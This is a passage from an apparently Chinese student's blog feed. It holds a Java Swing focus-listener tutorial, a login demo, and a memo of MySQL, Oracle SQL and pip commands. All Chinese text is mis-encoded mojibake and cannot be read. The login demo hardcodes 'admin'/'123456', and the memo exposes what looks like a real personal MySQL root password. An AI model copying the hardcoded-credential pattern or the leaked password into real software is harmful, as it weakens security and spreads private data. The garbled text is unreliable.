class_">FocusListener</span>()&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">focusLost</span><span class="hljs-params">(FocusEvent e)</span>&#123;<br>        <span class="hljs-comment">//å¤±å»ç„¦ç‚¹çš„æ—¶å€™</span><br>        <span class="hljs-comment">// åœ¨è¿™é‡Œç¼–å†™å¤±å»ç„¦ç‚¹æ—¶è¦æ‰§è¡Œçš„ä»£ç </span><br>        System.out.println(<span class="hljs-string">&quot;ç»„ä»¶å¤±å»ç„¦ç‚¹&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">focusGained</span><span class="hljs-params">(FocusEvent e)</span>&#123;<br>        <span class="hljs-comment">//è·å–ç„¦ç‚¹çš„æ—¶å€™  </span><br>        <span class="hljs-comment">// åœ¨è¿™é‡Œç¼–å†™è·å¾—ç„¦ç‚¹æ—¶è¦æ‰§è¡Œçš„ä»£ç </span><br>        System.out.println(<span class="hljs-string">&quot;ç»„ä»¶è·å¾—ç„¦ç‚¹&quot;</span>);<br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.awt.*;<br><span class="hljs-keyword">import</span> java.awt.event.FocusEvent;<br><span class="hljs-keyword">import</span> java.awt.event.FocusListener;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FocusListenerTemplate</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">JFrame</span> <span class="hljs-variable">frame</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JFrame</span>(<span class="hljs-string">&quot;ç„¦ç‚¹äº‹ä»¶æ¨¡æ¿&quot;</span>);<br>        frame.setLayout(<span class="hljs-keyword">new</span> <span class="hljs-title class_">GridLayout</span>(<span class="hljs-number">3</span>, <span class="hljs-number">1</span>));<br>        <br>        <span class="hljs-comment">// 1. æ–°å»ºç»„ä»¶</span><br>        <span class="hljs-type">JTextField</span> <span class="hljs-variable">textField1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JTextField</span>(<span class="hljs-string">&quot;æ–‡æœ¬æ¡†1&quot;</span>);<br>        <span class="hljs-type">JTextField</span> <span class="hljs-variable">textField2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JTextField</span>(<span class="hljs-string">&quot;æ–‡æœ¬æ¡†2&quot;</span>);<br>        <span class="hljs-type">JLabel</span> <span class="hljs-variable">statusLabel</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JLabel</span>(<span class="hljs-string">&quot;çŠ¶æ€: ç­‰å¾…ç„¦ç‚¹&quot;</span>, JLabel.CENTER);<br>        <br>        <span class="hljs-comment">// 2. æ·»åŠ åˆ°é¢æ¿</span><br>        frame.add(textField1);<br>        frame.add(textField2);<br>        frame.add(statusLabel);<br>        <br>        <span class="hljs-comment">// 3. æ³¨å†Œç›‘å¬å™¨ + 4. å®šä¹‰å¤„ç†æ–¹æ³•</span><br>        <span class="hljs-comment">// æ–‡æœ¬æ¡†1çš„ç„¦ç‚¹ç›‘å¬å™¨</span><br>        textField1.addFocusListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FocusListener</span>()&#123;<br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">focusLost</span><span class="hljs-params">(FocusEvent e)</span>&#123;<br>                <span class="hljs-comment">//å¤±å»ç„¦ç‚¹çš„æ—¶å€™</span><br>                <span class="hljs-type">JTextField</span> <span class="hljs-variable">source</span> <span class="hljs-operator">=</span> (JTextField) e.getSource();<br>                statusLabel.setText(<span class="hljs-string">&quot;æ–‡æœ¬æ¡†1å¤±å»ç„¦ç‚¹&quot;</span>);<br>                source.setBackground(Color.WHITE);<br>                System.out.println(<span class="hljs-string">&quot;æ–‡æœ¬æ¡†1å¤±å»ç„¦ç‚¹&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">focusGained</span><span class="hljs-params">(FocusEvent e)</span>&#123;<br>                <span class="hljs-comment">//è·å–ç„¦ç‚¹çš„æ—¶å€™  </span><br>                <span class="hljs-type">JTextField</span> <span class="hljs-variable">source</span> <span class="hljs-operator">=</span> (JTextField) e.getSource();<br>                statusLabel.setText(<span class="hljs-string">&quot;æ–‡æœ¬æ¡†1è·å¾—ç„¦ç‚¹&quot;</span>);<br>                source.setBackground(Color.YELLOW);<br>                System.out.println(<span class="hljs-string">&quot;æ–‡æœ¬æ¡†1è·å¾—ç„¦ç‚¹&quot;</span>);<br>            &#125;<br>        &#125;);<br>        <br>        <span class="hljs-comment">// æ–‡æœ¬æ¡†2çš„ç„¦ç‚¹ç›‘å¬å™¨</span><br>        textField2.addFocusListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FocusListener</span>()&#123;<br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">focusLost</span><span class="hljs-params">(FocusEvent e)</span>&#123;<br>                <span class="hljs-comment">//å¤±å»ç„¦ç‚¹çš„æ—¶å€™</span><br>                <span class="hljs-type">JTextField</span> <span class="hljs-variable">source</span> <span class="hljs-operator">=</span> (JTextField) e.getSource();<br>                statusLabel.setText(<span class="hljs-string">&quot;æ–‡æœ¬æ¡†2å¤±å»ç„¦ç‚¹&quot;</span>);<br>                source.setBackground(Color.WHITE);<br>                System.out.println(<span class="hljs-string">&quot;æ–‡æœ¬æ¡†2å¤±å»ç„¦ç‚¹&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">focusGained</span><span class="hljs-params">(FocusEvent e)</span>&#123;<br>                <span class="hljs-comment">//è·å–ç„¦ç‚¹çš„æ—¶å€™  </span><br>                <span class="hljs-type">JTextField</span> <span class="hljs-variable">source</span> <span class="hljs-operator">=</span> (JTextField) e.getSource();<br>                statusLabel.setText(<span class="hljs-string">&quot;æ–‡æœ¬æ¡†2è·å¾—ç„¦ç‚¹&quot;</span>);<br>                source.setBackground(Color.CYAN);<br>                System.out.println(<span class="hljs-string">&quot;æ–‡æœ¬æ¡†2è·å¾—ç„¦ç‚¹&quot;</span>);<br>            &#125;<br>        &#125;);<br>        <br>        frame.setSize(<span class="hljs-number">300</span>, <span class="hljs-number">200</span>);<br>        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);<br>        frame.setVisible(<span class="hljs-literal">true</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="å®æˆ˜"><a href="#å®æˆ˜" class="headerlink" title="å®æˆ˜"></a>å®æˆ˜</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.awt.*;<br><span class="hljs-keyword">import</span> java.awt.event.ActionEvent;<br><span class="hljs-keyword">import</span> java.awt.event.ActionListener;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">JFrame</span> <span class="hljs-variable">jf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JFrame</span>(<span class="hljs-string">&quot;ç™»é™†&quot;</span>);<br>        jf.setLayout(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FlowLayout</span>(FlowLayout.LEFT));<br>        jf.setBounds(<span class="hljs-number">460</span>, <span class="hljs-number">300</span>, <span class="hljs-number">300</span>, <span class="hljs-number">200</span>);<br><br>        <span class="hljs-type">JLabel</span> <span class="hljs-variable">label1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JLabel</span>(<span class="hljs-string">&quot;è´¦å·ï¼š&quot;</span>);<br>        <span class="hljs-type">JTextField</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JTextField</span>(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-number">20</span>);<br><br>        <span class="hljs-type">JLabel</span> <span class="hljs-variable">label2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JLabel</span>(<span class="hljs-string">&quot;å¯†ç ï¼š&quot;</span>);<br>        <span class="hljs-type">JPasswordField</span> <span class="hljs-variable">pwd</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JPasswordField</span>(<span class="hljs-number">20</span>); <span class="hljs-comment">// æ”¹ä¸ºå¯†ç æ¡†æ›´å®‰å…¨</span><br><br>        <span class="hljs-type">JButton</span> <span class="hljs-variable">button</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JButton</span>(<span class="hljs-string">&quot;ç™»é™†&quot;</span>);<br>        button.setPreferredSize(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Dimension</span>(<span class="hljs-number">80</span>, <span class="hljs-number">25</span>)); <span class="hljs-comment">// ä½¿ç”¨PreferredSizeæ›¿ä»£setSize</span><br><br>        <span class="hljs-type">JTextField</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JTextField</span>(<span class="hljs-string">&quot;ç™»å½•çŠ¶æ€&quot;</span>, <span class="hljs-number">20</span>);<br>        out.setEditable(<span class="hljs-literal">false</span>); <span class="hljs-comment">// è®¾ç½®ä¸ºä¸å¯ç¼–è¾‘</span><br><br>        <span class="hljs-comment">// æ·»åŠ ç™»å½•æŒ‰é’®çš„ç‚¹å‡»äº‹ä»¶</span><br>        button.addActionListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ActionListener</span>() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">actionPerformed</span><span class="hljs-params">(ActionEvent e)</span> &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> username.getText();<br>                <span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(pwd.getPassword());<br><br>                <span class="hljs-comment">// ç®€å•çš„ç™»å½•éªŒè¯</span><br>                <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;admin&quot;</span>.equals(user) &amp;&amp; <span class="hljs-string">&quot;123456&quot;</span>.equals(password)) &#123;<br>                    out.setText(<span class="hljs-string">&quot;ç™»å½•æˆåŠŸï¼&quot;</span>);<br>                    out.setBackground(Color.GREEN);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    out.setText(<span class="hljs-string">&quot;ç™»å½•å¤±è´¥ï¼&quot;</span>);<br>                    out.setBackground(Color.RED);<br>                &#125;<br>            &#125;<br>        &#125;);<br><br>        <span class="hljs-comment">// æ·»åŠ ç»„ä»¶åˆ°çª—å£</span><br>        jf.add(label1);<br>        jf.add(username);<br>        jf.add(label2);<br>        jf.add(pwd);<br>        jf.add(button);<br>        jf.add(out);<br><br>        jf.setResizable(<span class="hljs-literal">true</span>);<br>        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);<br>        jf.setVisible(<span class="hljs-literal">true</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>è¯¾è®¾é¡¹ç›®</title>
    <link href="/2025/05/26/%E8%AF%BE%E8%AE%BE%E9%A1%B9%E7%9B%AE/"/>
    <url>/2025/05/26/%E8%AF%BE%E8%AE%BE%E9%A1%B9%E7%9B%AE/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>å¤‡å¿˜å½•</title>
    <link href="/2025/04/14/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    <url>/2025/04/14/%E5%A4%87%E5%BF%98%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>mysql</p><p>î‚´</p><p>mysql â€“install MySQL</p><p>net start MySQL</p><p>  cd â€œC:\Program Files\MySQL\MySQL Server 8.0\binâ€</p><p>  mysql -u root -p<br>Enter password: 20041220a<br>Welcome to the MySQL monitor.  Commands end with ; or \g.<br>Your MySQL connection id is 8<br>Server version: 8.0.40 MySQL Community Server - GPL</p><p>oracle</p><p>net start OracleServiceORCL</p><p> sqlplus sys&#x2F;password as sysdba</p><h3 id="ğŸ“Œ-ç¬¬ä¸€æ­¥ï¼šåˆ›å»ºæ•°æ®åº“ç”¨æˆ·ï¼ˆåªåšä¸€æ¬¡ï¼‰"><a href="#ğŸ“Œ-ç¬¬ä¸€æ­¥ï¼šåˆ›å»ºæ•°æ®åº“ç”¨æˆ·ï¼ˆåªåšä¸€æ¬¡ï¼‰" class="headerlink" title="ğŸ“Œ ç¬¬ä¸€æ­¥ï¼šåˆ›å»ºæ•°æ®åº“ç”¨æˆ·ï¼ˆåªåšä¸€æ¬¡ï¼‰"></a>ğŸ“Œ ç¬¬ä¸€æ­¥ï¼šåˆ›å»ºæ•°æ®åº“ç”¨æˆ·ï¼ˆåªåšä¸€æ¬¡ï¼‰</h3><p>ä½ å·²ç»ç”¨ <code>sqlplus sys/password as sysdba</code> ç™»é™†äº†ï¼Œå…ˆåˆ›å»ºä¸€ä¸ªå­¦ä¹ ç”¨ç”¨æˆ·ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- åˆ›å»ºç”¨æˆ·</span><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">USER</span> testuser IDENTIFIED <span class="hljs-keyword">BY</span> test123;<br><br><span class="hljs-comment">-- æˆæƒ</span><br><span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">CONNECT</span>, RESOURCE <span class="hljs-keyword">TO</span> testuser;<br><br><span class="hljs-comment">-- ç»™æƒé™ï¼ˆå¯é€‰ï¼šæˆäºˆæ— é™è¡¨ç©ºé—´æƒé™ï¼‰</span><br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">USER</span> testuser <span class="hljs-keyword">DEFAULT</span> TABLESPACE users;<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">USER</span> testuser QUOTA UNLIMITED <span class="hljs-keyword">ON</span> users;<br></code></pre></td></tr></table></figure><p>âœ… ç„¶åä½ å¯ä»¥ç”¨ <code>testuser/test123@orcl</code> æ¥è¿æ¥ï¼ˆåœ¨ Navicat é‡Œé…ç½®è¿™ä¸ªè´¦å·ï¼‰</p><hr><h3 id="ğŸ“Œ-ç¬¬äºŒæ­¥ï¼šåˆ›å»ºè¡¨ï¼ˆå­¦ä¼šå»ºè¡¨ç»“æ„ï¼‰"><a href="#ğŸ“Œ-ç¬¬äºŒæ­¥ï¼šåˆ›å»ºè¡¨ï¼ˆå­¦ä¼šå»ºè¡¨ç»“æ„ï¼‰" class="headerlink" title="ğŸ“Œ ç¬¬äºŒæ­¥ï¼šåˆ›å»ºè¡¨ï¼ˆå­¦ä¼šå»ºè¡¨ç»“æ„ï¼‰"></a>ğŸ“Œ ç¬¬äºŒæ­¥ï¼šåˆ›å»ºè¡¨ï¼ˆå­¦ä¼šå»ºè¡¨ç»“æ„ï¼‰</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- ç™»å½• testuser åæ‰§è¡Œ</span><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> student (<br>    id NUMBER <span class="hljs-keyword">PRIMARY</span> KEY,<br>    name VARCHAR2(<span class="hljs-number">50</span>),<br>    age NUMBER,<br>    major VARCHAR2(<span class="hljs-number">100</span>)<br>);<br></code></pre></td></tr></table></figure><p>ğŸ” <strong>Navicat å¯¹ç…§æ“ä½œ</strong>ï¼š</p><ol><li>è¿æ¥ testuserï¼›</li><li>å³é”® â†’ æ–°å»ºè¡¨ï¼›</li><li>æ·»åŠ å­—æ®µï¼šidï¼ˆä¸»é”®ï¼‰ã€nameã€ageã€majorï¼›</li><li>ç‚¹å‡»ä¿å­˜ã€‚</li></ol><hr><h3 id="ğŸ“Œ-ç¬¬ä¸‰æ­¥ï¼šæ’å…¥æ•°æ®ï¼ˆå­¦å¢ï¼‰"><a href="#ğŸ“Œ-ç¬¬ä¸‰æ­¥ï¼šæ’å…¥æ•°æ®ï¼ˆå­¦å¢ï¼‰" class="headerlink" title="ğŸ“Œ ç¬¬ä¸‰æ­¥ï¼šæ’å…¥æ•°æ®ï¼ˆå­¦å¢ï¼‰"></a>ğŸ“Œ ç¬¬ä¸‰æ­¥ï¼šæ’å…¥æ•°æ®ï¼ˆå­¦å¢ï¼‰</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> student <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;å¼ ä¸‰&#x27;</span>, <span class="hljs-number">20</span>, <span class="hljs-string">&#x27;è®¡ç®—æœº&#x27;</span>);<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> student <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;æå››&#x27;</span>, <span class="hljs-number">22</span>, <span class="hljs-string">&#x27;é‡‘è&#x27;</span>);<br><span class="hljs-keyword">COMMIT</span>;<br></code></pre></td></tr></table></figure><p>ğŸ” <strong>Navicat å¯¹ç…§æ“ä½œ</strong>ï¼š</p><ol><li>å³é”®è¡¨ â†’ æ‰“å¼€è¡¨ï¼›</li><li>åˆ‡æ¢åˆ°â€œæ•°æ®â€é¡µç­¾ï¼›</li><li>æ‰‹åŠ¨æ·»åŠ æ•°æ®è¡Œï¼ŒCtrl+S ä¿å­˜ã€‚</li></ol><hr><h3 id="ğŸ“Œ-ç¬¬å››æ­¥ï¼šæŸ¥è¯¢æ•°æ®ï¼ˆå­¦æŸ¥ï¼‰"><a href="#ğŸ“Œ-ç¬¬å››æ­¥ï¼šæŸ¥è¯¢æ•°æ®ï¼ˆå­¦æŸ¥ï¼‰" class="headerlink" title="ğŸ“Œ ç¬¬å››æ­¥ï¼šæŸ¥è¯¢æ•°æ®ï¼ˆå­¦æŸ¥ï¼‰"></a>ğŸ“Œ ç¬¬å››æ­¥ï¼šæŸ¥è¯¢æ•°æ®ï¼ˆå­¦æŸ¥ï¼‰</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- æŸ¥è¯¢æ‰€æœ‰å­¦ç”Ÿ</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> student;<br><br><span class="hljs-comment">-- æŸ¥è¯¢è®¡ç®—æœºä¸“ä¸šçš„å­¦ç”Ÿ</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> student <span class="hljs-keyword">WHERE</span> major <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;è®¡ç®—æœº&#x27;</span>;<br></code></pre></td></tr></table></figure><hr><h3 id="ğŸ“Œ-ç¬¬äº”æ­¥ï¼šæ›´æ–°å’Œåˆ é™¤æ•°æ®ï¼ˆå­¦æ”¹åˆ ï¼‰"><a href="#ğŸ“Œ-ç¬¬äº”æ­¥ï¼šæ›´æ–°å’Œåˆ é™¤æ•°æ®ï¼ˆå­¦æ”¹åˆ ï¼‰" class="headerlink" title="ğŸ“Œ ç¬¬äº”æ­¥ï¼šæ›´æ–°å’Œåˆ é™¤æ•°æ®ï¼ˆå­¦æ”¹åˆ ï¼‰"></a>ğŸ“Œ ç¬¬äº”æ­¥ï¼šæ›´æ–°å’Œåˆ é™¤æ•°æ®ï¼ˆå­¦æ”¹åˆ ï¼‰</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- æ›´æ–°å¼ ä¸‰çš„å¹´é¾„</span><br><span class="hljs-keyword">UPDATE</span> student <span class="hljs-keyword">SET</span> age <span class="hljs-operator">=</span> <span class="hljs-number">21</span> <span class="hljs-keyword">WHERE</span> name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;å¼ ä¸‰&#x27;</span>;<br><br><span class="hljs-comment">-- åˆ é™¤æå››</span><br><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> student <span class="hljs-keyword">WHERE</span> name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;æå››&#x27;</span>;<br><span class="hljs-keyword">COMMIT</span>;<br></code></pre></td></tr></table></figure><hr><h3 id="ğŸ“Œ-ç¬¬å…­æ­¥ï¼šåˆ›å»ºè§†å›¾ï¼ˆå°è£…æŸ¥è¯¢é€»è¾‘ï¼‰"><a href="#ğŸ“Œ-ç¬¬å…­æ­¥ï¼šåˆ›å»ºè§†å›¾ï¼ˆå°è£…æŸ¥è¯¢é€»è¾‘ï¼‰" class="headerlink" title="ğŸ“Œ ç¬¬å…­æ­¥ï¼šåˆ›å»ºè§†å›¾ï¼ˆå°è£…æŸ¥è¯¢é€»è¾‘ï¼‰"></a>ğŸ“Œ ç¬¬å…­æ­¥ï¼šåˆ›å»ºè§†å›¾ï¼ˆå°è£…æŸ¥è¯¢é€»è¾‘ï¼‰</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">VIEW</span> cs_students <span class="hljs-keyword">AS</span><br><span class="hljs-keyword">SELECT</span> name, age <span class="hljs-keyword">FROM</span> student <span class="hljs-keyword">WHERE</span> major <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;è®¡ç®—æœº&#x27;</span>;<br></code></pre></td></tr></table></figure><p>æŸ¥è¯¢è§†å›¾ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> cs_students;<br></code></pre></td></tr></table></figure><hr><h3 id="ğŸ“Œ-ç¬¬ä¸ƒæ­¥ï¼šåˆ›å»ºç®€å•çš„å­˜å‚¨è¿‡ç¨‹ï¼ˆå­¦å‡½æ•°-é€»è¾‘ï¼‰"><a href="#ğŸ“Œ-ç¬¬ä¸ƒæ­¥ï¼šåˆ›å»ºç®€å•çš„å­˜å‚¨è¿‡ç¨‹ï¼ˆå­¦å‡½æ•°-é€»è¾‘ï¼‰" class="headerlink" title="ğŸ“Œ ç¬¬ä¸ƒæ­¥ï¼šåˆ›å»ºç®€å•çš„å­˜å‚¨è¿‡ç¨‹ï¼ˆå­¦å‡½æ•°&#x2F;é€»è¾‘ï¼‰"></a>ğŸ“Œ ç¬¬ä¸ƒæ­¥ï¼šåˆ›å»ºç®€å•çš„å­˜å‚¨è¿‡ç¨‹ï¼ˆå­¦å‡½æ•°&#x2F;é€»è¾‘ï¼‰</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">OR</span> REPLACE <span class="hljs-keyword">PROCEDURE</span> insert_student (<br>    p_id <span class="hljs-keyword">IN</span> NUMBER,<br>    p_name <span class="hljs-keyword">IN</span> VARCHAR2,<br>    p_age <span class="hljs-keyword">IN</span> NUMBER,<br>    p_major <span class="hljs-keyword">IN</span> VARCHAR2<br>) <span class="hljs-keyword">AS</span><br><span class="hljs-keyword">BEGIN</span><br>    <span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> student <span class="hljs-keyword">VALUES</span> (p_id, p_name, p_age, p_major);<br>    <span class="hljs-keyword">COMMIT</span>;<br><span class="hljs-keyword">END</span>;<br><span class="hljs-operator">/</span><br></code></pre></td></tr></table></figure><p>è°ƒç”¨ï¼šå…ˆæ£€æŸ¥è¡¨é‡Œæœ‰ä»€ä¹ˆæ•°æ®</p><p>åªæœ‰ commit ä¹‹åï¼Œå…¶ä»–äººæ‰èƒ½çœ‹åˆ°æ•°æ®å˜åŠ¨ã€‚</p><ol><li><pre><code class="hljs"> è½¬æ¢ requirements.txt ä¸º UTF-8 ç¼–ç powershell -Command &quot;Get-Content requirements.txt | Out-File -Encoding UTF8 requirements_utf8.txt&quot;<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">2.</span> <span class="hljs-strong">**ä½¿ç”¨æ­£ç¡®çš„å‘½ä»¤å®‰è£…**</span>ï¼š<br><br>   cmd<br><br></code></pre></td></tr></table></figure># æ–¹æ³•1: ä½¿ç”¨ python.exe è°ƒç”¨ pip æ¨¡å—C:\Users\a1348\AppData\Local\Programs\Python\Python38\python.exe -m pip install -r requirements_utf8.txt# æ–¹æ³•2: ç›´æ¥è°ƒç”¨ pip.exeC:\Users\a1348\AppData\Local\Programs\Python\Python38\Scripts\pip.exe install -r requirements_utf8.txt# æ–¹æ³•3: ä½¿ç”¨ py å¯åŠ¨å™¨ï¼ˆæ¨èï¼‰py -3.8 -m pip install -r 